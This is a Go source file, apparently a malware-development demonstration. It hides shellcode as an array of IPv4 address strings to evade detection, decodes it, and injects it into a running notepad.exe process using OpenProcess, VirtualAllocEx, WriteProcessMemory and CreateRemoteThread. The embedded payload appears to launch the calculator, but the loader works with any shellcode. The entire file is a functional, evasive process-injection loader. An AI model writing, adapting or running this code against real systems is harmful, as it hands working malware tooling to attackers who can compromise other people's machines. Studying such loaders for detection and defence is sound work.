package main

import (
	"errors"
	"fmt"
	"net"
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)


var (
    kernel32          = syscall.NewLazyDLL("kernel32.dll")
    VirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
    OpenProcess       = kernel32.NewProc("OpenProcess")
    CloseHandle       = kernel32.NewProc("CloseHandle")
)

const (
    PROCESS_ALL_ACCESS    = 0x1F0FFF
    MEM_COMMIT            = 0x1000
    MEM_RESERVE           = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)
// Original IPv4 address array
var Ipv4Array = []string{
	"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82",
	"32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",
	"82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
	"139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193",
	"56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",
	"1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
	"89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
	"111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71",
	"19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0",
}

// Ipv4Deobfuscation converts the provided IPv4 addresses to a byte buffer.
func Ipv4Deobfuscation(ipv4Array []string) ([]byte, error) {
	// Calculate buffer size: number of elements * 4 bytes per IPv4 address
	bufferSize := len(ipv4Array) * 4
	// Allocate a buffer to hold the deobfuscated addresses
	buffer := make([]byte, bufferSize)

	// Iterate over the IPv4 array and convert each address to a byte representation
	for i, ipStr := range ipv4Array {
		ip := net.ParseIP(ipStr)
		if ip == nil {
			return nil, fmt.Errorf("failed to parse IP address: %s", ipStr)
		}

		// Extract the 4-byte representation (IPv4) and copy it to the buffer
		ipv4 := ip.To4()
		if ipv4 == nil {
			return nil, errors.New("not an IPv4 address")
		}

		copy(buffer[i*4:(i+1)*4], ipv4)
	}

	return buffer, nil
}

func main() {
	// Perform deobfuscation on the given IPv4 array
	shellcode, err := Ipv4Deobfuscation(Ipv4Array)
	if err != nil {
		fmt.Printf("Deobfuscation failed: %v\n", err)
		return
	}

	// Display the deobfuscated shellcode size and content
	fmt.Printf("Deobfuscated size: %d bytes\n", len(shellcode))
	fmt.Printf("Deobfuscated buffer: %x\n", shellcode)

	 // Find the PID of notepad.exe
    pid, err := findProcessID("notepad.exe")
    if err != nil {
        fmt.Println("Failed to find process:", err)
        return
    }

    fmt.Printf("Found notepad.exe with PID %d\n", pid)

    // Open a handle to the target process
    processHandle, _, err := OpenProcess.Call(PROCESS_ALL_ACCESS, uintptr(0), uintptr(pid))
    if processHandle == 0 {
        fmt.Println("Failed to open target process:", err)
        return
    }
    defer CloseHandle.Call(processHandle)

    fmt.Printf("Opened process handle 0x%x\n", processHandle)

    // Allocate memory in the target process
    remoteAddr, _, err := VirtualAllocEx.Call(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if remoteAddr == 0 {
        fmt.Println("Memory allocation error:", err)
        return
    }

    // Write the shellcode into the allocated memory
    var written uintptr
    ret, _, err := WriteProcessMemory.Call(processHandle, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
    if ret == 0 {
        fmt.Println("Failed to write shellcode to target process:", err)
        return
    }

    // Create a remote thread in the target process to execute the shellcode
    threadHandle, _, err := CreateRemoteThread.Call(processHandle, 0, 0, remoteAddr, 0, 0, 0)
    if threadHandle == 0 {
        fmt.Println("Failed to create remote thread:", err)
        return
    }
    defer CloseHandle.Call(threadHandle)

    fmt.Println("Shellcode executed successfully.")
}


// findProcessID finds the PID of a running process by its name
func findProcessID(processName string) (uint32, error) {
    var processEntry windows.ProcessEntry32
    processEntry.Size = uint32(unsafe.Sizeof(processEntry))

    snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
    if err != nil {
        return 0, err
    }
    defer windows.CloseHandle(snapshot)

    if err := windows.Process32First(snapshot, &processEntry); err != nil {
        return 0, err
    }

    for {
        if windows.UTF16ToString(processEntry.ExeFile[:]) == processName {
            return processEntry.ProcessID, nil
        }
        if err := windows.Process32Next(snapshot, &processEntry); err != nil {
            break
        }
    }
    return 0, fmt.Errorf("process not found")
}